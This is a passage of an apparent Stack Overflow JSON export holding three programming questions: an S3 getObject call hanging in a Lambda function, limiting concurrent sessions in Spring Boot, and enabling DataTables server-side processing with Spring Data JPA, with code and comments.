clientConfiguration.setSocketTimeout(5000);\r\n AmazonS3 s3Client = AmazonS3ClientBuilder.standard()\r\n                        .withClientConfiguration(clientConfiguration)\r\n                        .withRegion(&quot;us-east-2&quot;)\r\n                        .enableForceGlobalBucketAccess()\r\n                        .build();\r\nfinal GetObjectRequest getObjectRequest = new GetObjectRequest(&lt;bucketName&gt;, &lt;objectKey&gt;);\r\nlog.info(&quot;Get object from bucket {}&quot;, getObjectRequest);\r\nS3Object object = s3Client.getObject(getObjectRequest);\r\n\r\n```\r\n\r\nNothing happens after: `s3Client.getObject()`\r\n\r\nI have tried exception handling, Verified the bucket name, key &amp; region. Provided the necessary permissions to s3 &amp; lambda. Not sure what else is wrong.\r\n","title":"S3 get object not responding","body":"<p>I have a lambda function in place which is connected to API Gateway. The lambda function fetches a file from S3. But Somehow, I am not getting any response from S3 &amp; the API Gateway request is timing out. Can you please help me understand the issue here?</p>\n<blockquote>\n<p>The file I am trying to read is just of 20B in size</p>\n</blockquote>\n<p>Code:-</p>\n<pre><code>\n ClientConfiguration clientConfiguration = new ClientConfiguration();\n clientConfiguration.setMaxErrorRetry(5);\n clientConfiguration.setSocketTimeout(5000);\n AmazonS3 s3Client = AmazonS3ClientBuilder.standard()\n                        .withClientConfiguration(clientConfiguration)\n                        .withRegion(&quot;us-east-2&quot;)\n                        .enableForceGlobalBucketAccess()\n                        .build();\nfinal GetObjectRequest getObjectRequest = new GetObjectRequest(&lt;bucketName&gt;, &lt;objectKey&gt;);\nlog.info(&quot;Get object from bucket {}&quot;, getObjectRequest);\nS3Object object = s3Client.getObject(getObjectRequest);\n\n</code></pre>\n<p>Nothing happens after: <code>s3Client.getObject()</code></p>\n<p>I have tried exception handling, Verified the bucket name, key &amp; region. Provided the necessary permissions to s3 &amp; lambda. Not sure what else is wrong.</p>\n"},{"tags":["java","spring-boot","spring-security","jwt"],"comments":[{"owner":{"account_id":6463892,"reputation":15974,"user_id":5277820,"accept_rate":68,"display_name":"dur"},"score":0,"creation_date":1683840026,"post_id":76217691,"comment_id":134432410,"body_markdown":"I don&#39;t see any JWT authentication in your configuration. There is only a form login, no JWT.","body":"I don&#39;t see any JWT authentication in your configuration. There is only a form login, no JWT."}],"answers":[{"tags":[],"owner":{"account_id":7134819,"reputation":5058,"user_id":5454842,"display_name":"Marcus Hert da Coregio"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1683723364,"creation_date":1683723364,"answer_id":76218689,"question_id":76217691,"body_markdown":"The [documentation says][1] that you have to publish the following bean:\r\n\r\n```java\r\n@Bean\r\npublic HttpSessionEventPublisher httpSessionEventPublisher() {\r\n    return new HttpSessionEventPublisher();\r\n}\r\n```\r\n\r\nHave you tried that?\r\n\r\n\r\n  [1]: https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html#ns-concurrent-sessions","title":"How to avoid concurrent sessions per user in a spring-boot application","body":"<p>The <a href=\"https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html#ns-concurrent-sessions\" rel=\"nofollow noreferrer\">documentation says</a> that you have to publish the following bean:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Bean\npublic HttpSessionEventPublisher httpSessionEventPublisher() {\n    return new HttpSessionEventPublisher();\n}\n</code></pre>\n<p>Have you tried that?</p>\n"}],"owner":{"account_id":19462220,"reputation":25,"user_id":14236284,"display_name":"Mayar"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":142,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":76218689,"answer_count":1,"score":0,"last_activity_date":1683723364,"creation_date":1683717057,"question_id":76217691,"body_markdown":"a spring-boot application with REST APIs has Login API generates token using JWT\r\nbut a user can login multiple times\r\nhow can I avoid this scenario? \r\n\r\nI tried the following configurations with no luck\r\n\r\n```\r\n    protected void configure(HttpSecurity http) throws Exception {\r\n        http\r\n            .authorizeRequests()\r\n                .antMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)\r\n                .antMatchers(&quot;/user/**&quot;).hasAnyRole(&quot;USER&quot;, &quot;ADMIN&quot;)\r\n                .anyRequest().authenticated()\r\n                .and()\r\n            .formLogin()\r\n                .and()\r\n            .logout()\r\n                .logoutSuccessUrl(&quot;/login?logout&quot;)\r\n                .and()\r\n            .sessionManagement()\r\n                .maximumSessions(1)\r\n                .maxSessionsPreventsLogin(true)\r\n                .expiredUrl(&quot;/login?expired&quot;)\r\n                .and()\r\n            .sessionFixation()\r\n                .migrateSession();\r\n    }\r\n```","title":"How to avoid concurrent sessions per user in a spring-boot application","body":"<p>a spring-boot application with REST APIs has Login API generates token using JWT\nbut a user can login multiple times\nhow can I avoid this scenario?</p>\n<p>I tried the following configurations with no luck</p>\n<pre><code>    protected void configure(HttpSecurity http) throws Exception {\n        http\n            .authorizeRequests()\n                .antMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)\n                .antMatchers(&quot;/user/**&quot;).hasAnyRole(&quot;USER&quot;, &quot;ADMIN&quot;)\n                .anyRequest().authenticated()\n                .and()\n            .formLogin()\n                .and()\n            .logout()\n                .logoutSuccessUrl(&quot;/login?logout&quot;)\n                .and()\n            .sessionManagement()\n                .maximumSessions(1)\n                .maxSessionsPreventsLogin(true)\n                .expiredUrl(&quot;/login?expired&quot;)\n                .and()\n            .sessionFixation()\n                .migrateSession();\n    }\n</code></pre>\n"},{"tags":["javascript","java","jquery","spring-boot","datatables"],"comments":[{"owner":{"account_id":12743722,"reputation":19956,"user_id":12567365,"display_name":"andrewJames"},"score":0,"creation_date":1683662555,"post_id":76212268,"comment_id":134400464,"body_markdown":"What does &quot;no luck&quot; mean? Can you describe where you are specifically getting stuck? The code in your question doesn&#39;t actually use server-side processing. There is no `serverSide : true` in your DataTable (except for one that&#39;s commented out). To enable server-side processing, you need to use that option.","body":"What does &quot;no luck&quot; mean? Can you describe where you are specifically getting stuck? The code in your question doesn&#39;t actually use server-side processing. There is no <code>serverSide : true</code> in your DataTable (except for one that&#39;s commented out). To enable server-side processing, you need to use that option."},{"owner":{"account_id":12743722,"reputation":19956,"user_id":12567365,"display_name":"andrewJames"},"score":0,"creation_date":1683662559,"post_id":76212268,"comment_id":134400466,"body_markdown":"Also, you are using Search Builder (`dom: &#39;Q...`) - so that means your server-side code (Spring) would also need to look in the request payload for those extra Search Builder parameters (not generated with normal server-side processing, without `Q`). Without those request parameters, Spring cannot know which page of data is being requested. That sample guide you are trying to follow will not help you with that.","body":"Also, you are using Search Builder (<code>dom: &#39;Q...</code>) - so that means your server-side code (Spring) would also need to look in the request payload for those extra Search Builder parameters (not generated with normal server-side processing, without <code>Q</code>). Without those request parameters, Spring cannot know which page of data is being requested. That sample guide you are trying to follow will not help you with that."},{"owner":{"account_id":27490497,"reputation":93,"user_id":20975951,"display_name":"Jaiylon"},"score":0,"creation_date":1683720171,"post_id":76212268,"comment_id":134409261,"body_markdown":"@andrewJames by no luck I mean, I&#39;ve tried to use the configuration that&#39;s commented out which has the `serverSide: true` and it didn&#39;t change anything. But I think I&#39;ll try to get it without the searchBuilder for now, as that would help remove some complexity.","body":"@andrewJames by no luck I mean, I&#39;ve tried to use the configuration that&#39;s commented out which has the <code>serverSide: true</code> and it didn&#39;t change anything. But I think I&#39;ll try to get it without the searchBuilder for now, as that would help remove some complexity."},{"owner":{"account_id":12743722,"reputation":19956,"user_id":12567365,"display_name":"andrewJames"},"score":0,"creation_date":1683720933,"post_id":76212268,"comment_id":134409489,"body_markdown":"OK - sounds good. Processing Search Builder parameters in server-side mode is much more complicated than plain server-side processing. But even so, can you show that simpler code in your question and clarify where you are getting stuck?","body":"OK - sounds good. Processing Search Builder parameters in server-side mode is much more complicated than plain server-side processing. But even so, can you show that simpler code in your question and clarify where you are getting stuck?"},{"owner":{"account_id":27490497,"reputation":93,"user_id":20975951,"display_name":"Jaiylon"},"score":0,"creation_date":1683722618,"post_id":76212268,"comment_id":134409937,"body_markdown":"@Ok I&#39;ll update it in a second, but when following the steps in the Git repository, it requires you to add the DataTables dependency to the `pom.xml` file. Next, in the repository interface (in my case the `RepRepository`)you have to extend the `DataTablesRepository`. And then in the controller class you have to create a method with a `value=&quot;url&quot;` which would be the URL that the `serverSide: true` configuration uses for the value of the url key. So that&#39;s where I am stuck, trying to actually retrieve the data using the DataTable repository from the database.","body":"@Ok I&#39;ll update it in a second, but when following the steps in the Git repository, it requires you to add the DataTables dependency to the <code>pom.xml</code> file. Next, in the repository interface (in my case the <code>RepRepository</code>)you have to extend the <code>DataTablesRepository</code>. And then in the controller class you have to create a method with a <code>value=&quot;url&quot;</code> which would be the URL that the <code>serverSide: true</code> configuration uses for the value of the url key. So that&#39;s where I am stuck, trying to actually retrieve the data using the DataTable repository from the database."},{"owner":{"account_id":27490497,"reputation":93,"user_id":20975951,"display_name":"Jaiylon"},"score":0,"creation_date":1683723253,"post_id":76212268,"comment_id":134410107,"body_markdown":"I&#39;ve updated the question a bit.","body":"I&#39;ve updated the question a bit."},{"owner":{"account_id":12743722,"reputation":19956,"user_id":12567365,"display_name":"andrewJames"},"score":0,"creation_date":1683724403,"post_id":76212268,"comment_id":134410425,"body_markdown":"&quot;_So that&#39;s where I am stuck_&quot; - OK then you need to ask a much more specific and focused question about that step. Your problem has nothing to do with DataTables. It is all about following [these &quot;Getting Started&quot; instructions](https://github.com/darrachequesne/spring-data-jpa-datatables#getting-started), for the specific project you found on GitHub. Currently, your question does not even mention any of these details - and I think all the code you are showing us is irrelevant. (I see that the project _does_ have logic for Search Builder - very nice!).","body":"&quot;<i>So that&#39;s where I am stuck</i>&quot; - OK then you need to ask a much more specific and focused question about that step. Your problem has nothing to do with DataTables. It is all about following <a href=\"https://github.com/darrachequesne/spring-data-jpa-datatables#getting-started\" rel=\"nofollow noreferrer\">these &quot;Getting Started&quot; instructions</a>, for the specific project you found on GitHub. Currently, your question does not even mention any of these details - and I think all the code you are showing us is irrelevant. (I see that the project <i>does</i> have logic for Search Builder - very nice!)."},{"owner":{"account_id":27490497,"reputation":93,"user_id":20975951,"display_name":"Jaiylon"},"score":0,"creation_date":1683741567,"post_id":76212268,"comment_id":134414855,"body_markdown":"This method is supposed so retrieve the data from a database and the `\\representatives` value is supposed to be used by the DataTable configuration. `@RequestMapping(value = &quot;/representatives&quot;, method = RequestMethod.GET)\n    public DataTablesOutput&lt;Representatives&gt; getUsers(@Valid DataTablesInput input) {\n        DataTablesOutput&lt;Representatives&gt; output = repository.findAll(input);\n        return output;\n    }` DataTable configuration: `&#39;url&#39;: &#39;/representatives&#39;`. But I see this error in my browser console `tp://localhost:8080/rep/rep/representatives 404`","body":"This method is supposed so retrieve the data from a database and the <code>\\representatives</code> value is supposed to be used by the DataTable configuration. <code>@RequestMapping(value = &quot;&#47;representatives&quot;, method = RequestMethod.GET)     public DataTablesOutput&lt;Representatives&gt; getUsers(@Valid DataTablesInput input) {         DataTablesOutput&lt;Representatives&gt; output = repository.findAll(input);         return output;     }</code> DataTable configuration: <code>&#39;url&#39;: &#39;&#47;representatives&#39;</code>. But I see this error in my browser console <code>tp:&#47;&#47;localhost:8080&#47;rep&#47;rep&#47;representatives 404</code>"}],"owner":{"account_id":27490497,"reputation":93,"user_id":20975951,"display_name":"Jaiylon"},"comment_count":8,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":225,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683723234,"creation_date":1683655608,"question_id":76212268,"body_markdown":"I am using DataTables but I want to switch to server-side processing in order to decrease loading times when working with large datasets, I am trying to follow this guide, but so far I&#39;ve had no luck: https://github.com/darrachequesne/spring-data-jpa-datatables-sample\r\n\r\nHere is my code:\r\n**allRepresentatives.html/Or you can say index**\r\n```html\r\n&lt;!DOCTYPE html&gt;\r\n&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.w3.org/1999/xhtml&quot;&gt;\r\n&lt;head&gt;\r\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\r\n    &lt;title&gt;Aegis&lt;/title&gt;\r\n    &lt;!--    searchBuilder and DataTables extensions--&gt;\r\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.datatables.net/searchbuilder/1.4.2/css/searchBuilder.dataTables.min.css&quot;&gt;\r\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.datatables.net/1.13.4/css/jquery.dataTables.min.css&quot;&gt;\r\n    &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot; integrity=&quot;sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;\r\n    &lt;script src=&quot;//cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js&quot;&gt;&lt;/script&gt;\r\n    &lt;script src=&quot;https://cdn.datatables.net/searchbuilder/1.4.2/js/dataTables.searchBuilder.min.js&quot;&gt;&lt;/script&gt;\r\n    &lt;!--  bootstrap extensions  --&gt;\r\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css&quot;&gt;\r\n    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;\r\n    &lt;style&gt;\r\n        .bg-light {\r\n            --bs-bg-opacity: 1;\r\n            background-color: rgb(171, 28, 164, 1) !important;\r\n        }\r\n\r\n        h2{\r\n            color: gray;\r\n        }\r\n\r\n        p{\r\n            margin: 0;\r\n        }\r\n\r\n        body{\r\n            font-family: &#39;Open Sans&#39;, &quot;Segoe UI Light&quot;;\r\n        }\r\n\r\n        .form-headings{\r\n            background-color: rgb(71 70 70);\r\n        }\r\n\r\n        .form-actions{\r\n            background-color: darkgray;\r\n        }\r\n\r\n        .form-headings div{\r\n            color: white;\r\n            font-weight: bold;\r\n            text-align: center;\r\n            margin-top: auto;\r\n            margin-bottom: auto;\r\n        }\r\n\r\n        i{\r\n            font-size: x-large;\r\n        }\r\n\r\n        a{\r\n            text-decoration: none;\r\n        }\r\n\r\n        .dropdown-btn{\r\n            background-color: #f0f8ff00;\r\n            border:0;\r\n            color: #212529;\r\n            font-weight:400;\r\n            padding: 0.25rem 1rem;\r\n            white-space: nowrap;\r\n            width: 100%;\r\n            display:block;\r\n            text-align:start;\r\n        }\r\n\r\n        .dropdown-btn:hover{\r\n            color: #1e2125;\r\n            background-color: #e9ecef;\r\n        }\r\n        /**/\r\n\r\n\r\n    &lt;/style&gt;\r\n\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;div class=&quot;container&quot;&gt;\r\n    &lt;h2 class=&quot;m-5 ms-0 me-0 mb-4&quot;&gt;\r\n        ORGANISATIONS\r\n    &lt;/h2&gt;\r\n    &lt;div&gt;\r\n        &lt;div&gt;\r\n        &lt;!--For testing--&gt;\r\n            &lt;label for=&quot;gender-select&quot;&gt;Filter by Gender:&lt;/label&gt;\r\n            &lt;select id=&quot;gender-select&quot;&gt;\r\n                &lt;option value=&quot;all&quot;&gt;All Employees&lt;/option&gt;\r\n                &lt;option value=&quot;female&quot;&gt;Female Employees&lt;/option&gt;\r\n            &lt;/select&gt;\r\n        &lt;/div&gt;\r\n        &lt;div class=&quot;alphabet&quot;&gt;\r\n            &lt;ul&gt;\r\n                &lt;li th:each=&quot;letter : ${letterList}&quot;&gt;\r\n                    &lt;a th:href=&quot;@{/entities(letter=${letter})}&quot; th:class=&quot;${letter == selectedLetter} ? active : &#39;&#39;&quot; th:text=&quot;${letter}&quot;&gt;&lt;/a&gt;\r\n                &lt;/li&gt;\r\n            &lt;/ul&gt;\r\n        &lt;/div&gt;\r\n&lt;!--        &lt;button id=&quot;myTable_filter&quot; class=&quot;btn btn-primary&quot;&gt;Add Condition for search&lt;/button&gt;--&gt;\r\n        &lt;div id=&quot;entities&quot; th:fragment=&quot;representatives&quot;&gt;\r\n            &lt;table id=&quot;repsTable&quot; class=&quot;display&quot; data-order=&#39;[[1, &quot;asc&quot;]]&#39; style=&quot;width:100%&quot;&gt;\r\n                &lt;thead&gt;\r\n                &lt;tr&gt;\r\n                    &lt;th&gt;First Name&lt;/th&gt;\r\n                    &lt;th&gt;Last Name&lt;/th&gt;\r\n                    &lt;th&gt;Email&lt;/th&gt;\r\n                    &lt;th&gt;Gender&lt;/th&gt;\r\n                    &lt;th&gt;Company&lt;/th&gt;\r\n                &lt;/tr&gt;\r\n                &lt;/thead&gt;\r\n                &lt;tbody&gt;\r\n                &lt;div&gt;\r\n                    &lt;tr th:each=&quot;rep : ${representatives}&quot;&gt;\r\n                        &lt;td th:text=&quot;${rep.firstName}&quot;&gt;&lt;/td&gt;\r\n                        &lt;td th:text=&quot;${rep.lastName}&quot;&gt;&lt;/td&gt;\r\n                        &lt;td th:text=&quot;${rep.email}&quot;&gt;&lt;/td&gt;\r\n                        &lt;td th:text=&quot;${rep.gender}&quot;&gt;&lt;/td&gt;\r\n                        &lt;td th:text=&quot;${rep.company}&quot;&gt;&lt;/td&gt;\r\n                    &lt;/tr&gt;\r\n                &lt;/div&gt;\r\n                &lt;/tbody&gt;\r\n                &lt;tfoot&gt;\r\n                &lt;tr&gt;\r\n                    &lt;th&gt;First Name&lt;/th&gt;\r\n                    &lt;th&gt;Last Name&lt;/th&gt;\r\n                    &lt;th&gt;Email&lt;/th&gt;\r\n                    &lt;th&gt;Gender&lt;/th&gt;\r\n                    &lt;th&gt;Company&lt;/th&gt;\r\n                &lt;/tr&gt;\r\n                &lt;/tfoot&gt;\r\n            &lt;/table&gt;\r\n        &lt;/div&gt;\r\n    &lt;/div&gt;\r\n\r\n    &lt;script&gt;\r\nlet table;\r\n\r\n$(document).ready(function() {\r\n    table = $(&#39;#repsTable&#39;).DataTable({\r\n        serverSide: true,\r\n        paging: true,\r\n        pageLength: 10,\r\n        lengthMenu: [10, 25, 50, 100],\r\n        searching: true,\r\n        ordering: true,\r\n        stateSave: true,\r\n        ajax: {\r\n            url: &#39;/rep/representatives&#39;,\r\n            type: &#39;POST&#39;\r\n        },\r\n        columns: [\r\n            { data: &#39;id&#39; },\r\n            { data: &#39;firstName&#39; },\r\n            { data: &#39;lastName&#39; },\r\n            { data: &#39;email&#39; },\r\n            { data: &#39;gender&#39; },\r\n            { data: &#39;conpany&#39; }\r\n        ]\r\n    });\r\n});\r\n\r\n\r\n\r\n&lt;/script&gt;\r\n&lt;/div&gt;\r\n&lt;script th:src=&quot;@{/JS/script.js}&quot;&gt;&lt;/script&gt;\r\n&lt;script th:src=&quot;@{/JS/toggleFilters.js}&quot;&gt;&lt;/script&gt;\r\n\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n```\r\n\r\n**This is my RepService.java class:**\r\n```java\r\n@Service\r\npublic class RepService {\r\n    @Autowired\r\n    private RepRepository repository;\r\n\r\n    public Iterable&lt;Representatives&gt; getEntities() {\r\n        Sort sort = Sort.by(&quot;firstName&quot;).ascending();\r\n        return repository.findAll(sort);//This method finds all the records in the database\r\n    }\r\n\r\n    public Long count(){\r\n        return repository.count();\r\n    }\r\n\r\n    public List&lt;Representatives&gt; findByEmailStartsWith(String email) {\r\n        return repository.findByEmailStartsWith(email);\r\n    }\r\n\r\n}\r\n```\r\n**This is my RepController.java class:**\r\n```java\r\n@Controller\r\n@RequestMapping(&quot;/rep&quot;)\r\npublic class RepController {\r\n    protected final int pageSize = 10;\r\n    @Autowired\r\n    private RepService repService;\r\n\r\n    @Autowired\r\n    private RepRepository repository;\r\n\r\n    @Autowired\r\n    EntityManager entityManager;\r\n\r\n    @GetMapping(&quot;getRepresentativesStartingWith/{companyName}&quot;)\r\n    ModelAndView getCompanyStartingWith(@PathVariable(&quot;companyName&quot;)\r\n                                        String email, String fName) {\r\n        return new ModelAndView(&quot;allRepresentatives :: representatives&quot;,\r\n                &quot;representatives&quot;,\r\n                repService.findByEmailStartsWith(email));\r\n    }\r\n    @RequestMapping(value = &quot;/representatives&quot;, method = RequestMethod.GET)\r\n    public DataTablesOutput&lt;Representatives&gt; list(@Valid DataTablesInput input) {\r\n        return repository.findAll(input);\r\n    }\r\n\r\n    @RequestMapping(value = &quot;/representatives&quot;, method = RequestMethod.POST)\r\n    public DataTablesOutput&lt;Representatives&gt; listPOST(@Valid @RequestBody DataTablesInput input) {\r\n        int start = input.getStart();\r\n        input.setLength(10); // Set the number of records to retrieve to 10\r\n        return repository.findAll(input);\r\n    }//I think that these are the two method I&#39;m supposed to use to send and retrieve data to and from the database. **This is where I am stuck.**\r\n\r\n\r\n\r\n    @PostMapping(&quot;/getEntities&quot;)\r\n    @ResponseBody\r\n    public DataTablesOutput&lt;Representatives&gt; getEntities(@Valid @RequestBody DataTablesInput input) {\r\n        return repository.findAll(input);\r\n    }\r\n//The getFirstTenEntities method creates a ModelAndView, as well as an attribute for the data that is used to iterate over on the HTML page.\r\n    public ModelAndView getFirstTenEntities(String returnPage, String attributeName) {\r\n        ModelAndView modelAndView = new ModelAndView(returnPage);\r\n        modelAndView.addObject(attributeName, repService.getEntities());\r\n        return modelAndView;\r\n    }\r\n//This method just returns the viewModel `allRepresentatives.html`\r\n    @GetMapping(&quot;getFirstTenRepresentatives&quot;)\r\n    public ModelAndView getFirstTenReps(){\r\n        return getFirstTenEntities(&quot;allRepresentatives&quot;,\r\n                &quot;representatives&quot;);\r\n    }\r\n\r\n\r\n}\r\n```\r\n**Finally the main class:**\r\n```java\r\n@SpringBootApplication\r\n//@EnableJpaRepositories(repositoryFactoryBeanClass = DataTablesRepositoryFactoryBean.class)\r\npublic class DatatablesApplication {\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\tSpringApplication.run(DatatablesApplication.class, args);\r\n\t}\r\n\r\n}\r\n\r\n```","title":"How to enable server-side processing in DataTables?","body":"<p>I am using DataTables but I want to switch to server-side processing in order to decrease loading times when working with large datasets, I am trying to follow this guide, but so far I've had no luck: <a href=\"https://github.com/darrachequesne/spring-data-jpa-datatables-sample\" rel=\"nofollow noreferrer\">https://github.com/darrachequesne/spring-data-jpa-datatables-sample</a></p>\n<p>Here is my code:\n<strong>allRepresentatives.html/Or you can say index</strong></p>\n<pre class=\"lang-html prettyprint-override\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.w3.org/1999/xhtml&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Aegis&lt;/title&gt;\n    &lt;!--    searchBuilder and DataTables extensions--&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.datatables.net/searchbuilder/1.4.2/css/searchBuilder.dataTables.min.css&quot;&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.datatables.net/1.13.4/css/jquery.dataTables.min.css&quot;&gt;\n    &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot; integrity=&quot;sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;\n    &lt;script src=&quot;//cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js&quot;&gt;&lt;/script&gt;\n    &lt;script src=&quot;https://cdn.datatables.net/searchbuilder/1.4.2/js/dataTables.searchBuilder.min.js&quot;&gt;&lt;/script&gt;\n    &lt;!--  bootstrap extensions  --&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css&quot;&gt;\n    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;\n    &lt;style&gt;\n        .bg-light {\n            --bs-bg-opacity: 1;\n            background-color: rgb(171, 28, 164, 1) !important;\n        }\n\n        h2{\n            color: gray;\n        }\n\n        p{\n            margin: 0;\n        }\n\n        body{\n            font-family: 'Open Sans', &quot;Segoe UI Light&quot;;\n        }\n\n        .form-headings{\n            background-color: rgb(71 70 70);\n        }\n\n        .form-actions{\n            background-color: darkgray;\n        }\n\n        .form-headings div{\n            color: white;\n            font-weight: bold;\n            text-align: center;\n            margin-top: auto;\n            margin-bottom: auto;\n        }\n\n        i{\n            font-size: x-large;\n        }\n\n        a{\n            text-decoration: none;\n        }\n\n        .dropdown-btn{\n            background-color: #f0f8ff00;\n            border:0;\n            color: #212529;\n            font-weight:400;\n            padding: 0.25rem 1rem;\n            white-space: nowrap;\n            width: 100%;\n            display:block;\n            text-align:start;\n        }\n\n        .dropdown-btn:hover{\n            color: #1e2125;\n            background-color: #e9ecef;\n        }\n        /**/\n\n\n    &lt;/style&gt;\n\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=&quot;container&quot;&gt;\n    &lt;h2 class=&quot;m-5 ms-0 me-0 mb-4&quot;&gt;\n        ORGANISATIONS\n    &lt;/h2&gt;\n    &lt;div&gt;\n        &lt;div&gt;\n        &lt;!--For testing--&gt;\n            &lt;label for=&quot;gender-select&quot;&gt;Filter by Gender:&lt;/label&gt;\n            &lt;select id=&quot;gender-select&quot;&gt;\n                &lt;option value=&quot;all&quot;&gt;All Employees&lt;/option&gt;\n                &lt;option value=&quot;female&quot;&gt;Female Employees&lt;/option&gt;\n            &lt;/select&gt;\n        &lt;/div&gt;\n        &lt;div class=&quot;alphabet&quot;&gt;\n            &lt;ul&gt;\n                &lt;li th:each=&quot;letter : ${letterList}&quot;&gt;\n                    &lt;a th:href=&quot;@{/entities(letter=${letter})}&quot; th:class=&quot;${letter == selectedLetter} ? active : ''&quot; th:text=&quot;${letter}&quot;&gt;&lt;/a&gt;\n                &lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/div&gt;\n&lt;!--        &lt;button id=&quot;myTable_filter&quot; class=&quot;btn btn-primary&quot;&gt;Add Condition for search&lt;/button&gt;--&gt;\n        &lt;div id=&quot;entities&quot; th:fragment=&quot;representatives&quot;&gt;\n            &lt;table id=&quot;repsTable&quot; class=&quot;display&quot; data-order='[[1, &quot;asc&quot;]]' style=&quot;width:100%&quot;&gt;\n                &lt;thead&gt;\n                &lt;tr&gt;\n                    &lt;th&gt;First Name&lt;/th&gt;\n                    &lt;th&gt;Last Name&lt;/th&gt;\n                    &lt;th&gt;Email&lt;/th&gt;\n                    &lt;th&gt;Gender&lt;/th&gt;\n                    &lt;th&gt;Company&lt;/th&gt;\n                &lt;/tr&gt;\n                &lt;/thead&gt;\n                &lt;tbody&gt;\n                &lt;div&gt;\n                    &lt;tr th:each=&quot;rep : ${representatives}&quot;&gt;\n                        &lt;td th:text=&quot;${rep.firstName}&quot;&gt;&lt;/td&gt;\n                        &lt;td th:text=&quot;${rep.lastName}&quot;&gt;&lt;/td&gt;\n                        &lt;td th:text=&quot;${rep.email}&quot;&gt;&lt;/td&gt;\n                        &lt;td th:text=&quot;${rep.gender}&quot;&gt;&lt;/td&gt;\n                        &lt;td th:text=&quot;${rep.company}&quot;&gt;&lt;/td&gt;\n                    &lt;/tr&gt;\n                &lt;/div&gt;\n                &lt;/tbody&gt;\n                &lt;tfoot&gt;\n                &lt;tr&gt;\n                    &lt;th&gt;First Name&lt;/th&gt;\n                    &lt;th&gt;Last Name&lt;/th&gt;\n                    &lt;th&gt;Email&lt;/th&gt;\n                    &lt;th&gt;Gender&lt;/th&gt;\n                    &lt;th&gt;Company&lt;/th&gt;\n                &lt;/tr&gt;\n                &lt;/tfoot&gt;\n            &lt;/table&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n\n    &lt;script&gt;\nlet table;\n\n$(document).ready(function() {\n    table = $('#repsTable').DataTable({\n        serverSide: true,\n        paging: true,\n        pageLength: 10,\n        lengthMenu: [10, 25, 50, 100],\n        searching: true,\n        ordering: true,\n        stateSave: true,\n        ajax: {\n            url: '/rep/representatives',\n            type: 'POST'\n        },\n        columns: [\n            { data: 'id' },\n            { data: 'firstName' },\n            { data: 'lastName' },\n            { data: 'email' },\n            { data: 'gender' },\n            { data: 'conpany' }\n        ]\n    });\n});\n\n\n\n&lt;/script&gt;\n&lt;/div&gt;\n&lt;script th:src=&quot;@{/JS/script.js}&quot;&gt;&lt;/script&gt;\n&lt;script th:src=&quot;@{/JS/toggleFilters.js}&quot;&gt;&lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p><strong>This is my RepService.java class:</strong></p>\n<pre class=\"lang-java prettyprint-override\"><code>@Service\npublic class RepService {\n    @Autowired\n    private RepRepository repository;\n\n    public Iterable&lt;Representatives&gt; getEntities() {\n        Sort sort = Sort.by(&quot;firstName&quot;).ascending();\n        return repository.findAll(sort);//This method finds all the records in the database\n    }\n\n    public Long count(){\n        return repository.count();\n    }\n\n    public List&lt;Representatives&gt; findByEmailStartsWith(String email) {\n        return repository.findByEmailStartsWith(email);\n    }\n\n}\n</code></pre>\n<p><strong>This is my RepController.java class:</strong></p>\n<pre class=\"lang-java prettyprint-override\"><code>@Controller\n@RequestMapping(&quot;/rep&quot;)\npublic class RepController {\n    protected final int pageSize = 10;\n    @Autowired\n    private RepService repService;\n\n    @Autowired\n    private RepRepository repository;\n\n    @Autowired\n    EntityManager entityManager;\n\n    @GetMapping(&quot;getRepresentativesStartingWith/{companyName}&quot;)\n    ModelAndView getCompanyStartingWith(@PathVariable(&quot;companyName&quot;)\n                                        String email, String fName) {\n        return new ModelAndView(&quot;allRepresentatives :: representatives&quot;,\n                &quot;representatives&quot;,\n                repService.findByEmailStartsWith(email));\n    }\n    @RequestMapping(value = 